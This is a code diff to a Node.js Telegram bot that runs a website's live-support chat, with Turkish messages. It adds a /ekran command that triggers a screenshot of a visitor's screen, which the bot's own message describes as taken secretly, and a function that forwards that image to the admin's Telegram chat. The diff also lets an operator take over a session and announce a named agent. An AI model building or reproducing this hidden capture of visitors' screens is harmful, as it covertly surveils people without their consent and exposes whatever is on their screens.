@@ -600,14 +600,29 @@ function initTelegramBot(app, io) {
 
 
   // Command: /canlidestekbaglan
-  bot.onText(/^\/canlidestekbaglan(?:\s+(.+))?$/, (msg, match) => {
+  bot.onText(/^\/canlidestekbaglan(?:\s+([^\s]+))?(?:\s+([^\s]+))?$/i, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return;
 
-    const sessionId = match[1];
-    if (!sessionId) {
-      return bot.sendMessage(chatId, `Lütfen bir ID girin. Örn: /canlidestekbaglan A7B9X`);
+    let agentFlag = null;
+    let sessionId = null;
+
+    if (match[2]) {
+      // Has two arguments (e.g. /canlidestekbaglan c A7B9X)
+      agentFlag = match[1].toLowerCase();
+      sessionId = match[2];
+    } else {
+      // Has one argument (e.g. /canlidestekbaglan A7B9X)
+      sessionId = match[1];
     }
+
+    if (!sessionId) {
+      return bot.sendMessage(chatId, `Lütfen bir ID girin. Örn: /canlidestekbaglan c A7B9X`);
+    }
+
+    let agentName = null;
+    if (agentFlag === 'c') agentName = 'Caner Karakuş';
+    else if (agentFlag === 'y') agentName = 'Yaşarhan Pekergin';
 
     activeHijackedChats.add(sessionId);
     adminCurrentSupportSession = sessionId;
@@ -616,9 +631,12 @@ function initTelegramBot(app, io) {
     const io = reqApp.get('io');
     if (io) {
       io.to(sessionId).emit('support_chat_hijacked');
+      if (agentName) {
+        io.to(sessionId).emit('support_system_message', { text: `${agentName} bağlandı.` });
+      }
     }
 
-    bot.sendMessage(chatId, `🔌 <b>Sisteme Bağlanıldı! (#${sessionId})</b>\n\nŞu andan itibaren yapay zeka bu kullanıcıya cevap vermeyecek. Buraya yazdığınız her mesaj DOĞRUDAN müşterinin canlı destek ekranına gidecek.\n\nAyrılmak için: /canlidestekayril`, { parse_mode: 'HTML' });
+    bot.sendMessage(chatId, `🔌 <b>Sisteme Bağlanıldı! (#${sessionId})</b>\n\nŞu andan itibaren yapay zeka bu kullanıcıya cevap vermeyecek. Buraya yazdığınız her mesaj DOĞRUDAN müşterinin canlı destek ekranına gidecek.${agentName ? `\n\nKullanıcıya <b>"${agentName} bağlandı."</b> bildirimi gönderildi.` : ''}\n\nAyrılmak için: /canlidestekayril`, { parse_mode: 'HTML' });
   });
 
   // Command: /canlidestekayril
@@ -707,6 +725,26 @@ function initTelegramBot(app, io) {
     if (pendingFileDrops.has(chatId)) {
       pendingFileDrops.delete(chatId);
       bot.sendMessage(chatId, `🛑 <b>AirDrop İşlemi İptal Edildi.</b>`, { parse_mode: 'HTML' });
+    }
+  });
+
+  // Command: /ekran (Request Screenshot)
+  bot.onText(/^\/ekran(?:\s+([^\s]+))?$/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!isAuthorized(msg)) return;
+
+    let targetSessionId = match[1] || adminCurrentSupportSession;
+
+    if (!targetSessionId) {
+      return bot.sendMessage(chatId, `Hatalı kullanım. Lütfen şu formatı kullanın:\n/ekran [ID]\nveya halihazırda bağlıysanız:\n/ekran`);
+    }
+
+    const io = reqApp.get('io');
+    if (io) {
+      io.to(targetSessionId).emit('request_screenshot', { adminChatId: chatId });
+      bot.sendMessage(chatId, `📸 <b>Ekran Talebi Gönderildi (#${targetSessionId})</b>\n\nZiyaretçinin ekran görüntüsü gizlice alınıyor, birkaç saniye içinde buraya düşecek...`, { parse_mode: 'HTML' });
+    } else {
+      bot.sendMessage(chatId, `Soket bağlantısı kurulamadı.`);
     }
   });
 
@@ -1901,4 +1939,14 @@ async function sendTelegramMessage(text) {
   }
 }
 
-module.exports = { initTelegramBot, sendTelegramMessage, isSessionHijacked, notifyLiveSupportMessage, notifyEasterEgg, notifyLoginRequest, notifyLoginSuccess, notifyVoiceMessage, notifyHumanRequest };
+const sendScreenshotToTelegram = async (adminChatId, base64Data, sessionId) => {
+  try {
+    const buffer = Buffer.from(base64Data.split(',')[1], 'base64');
+    await bot.sendPhoto(adminChatId, buffer, { caption: `📸 #${sessionId} Kullanıcısının Anlık Ekran Görüntüsü` });
+  } catch (err) {
+    console.error('Screenshot send error', err);
+    bot.sendMessage(adminChatId, `❌ Ekran görüntüsü iletilemedi: ${err.message}`);
+  }
+};
+
+module.exports = { initTelegramBot, sendTelegramMessage, sendScreenshotToTelegram, isSessionHijacked, notifyLiveSupportMessage, notifyEasterEgg, notifyLoginRequest, notifyLoginSuccess, notifyVoiceMessage, notifyHumanRequest };
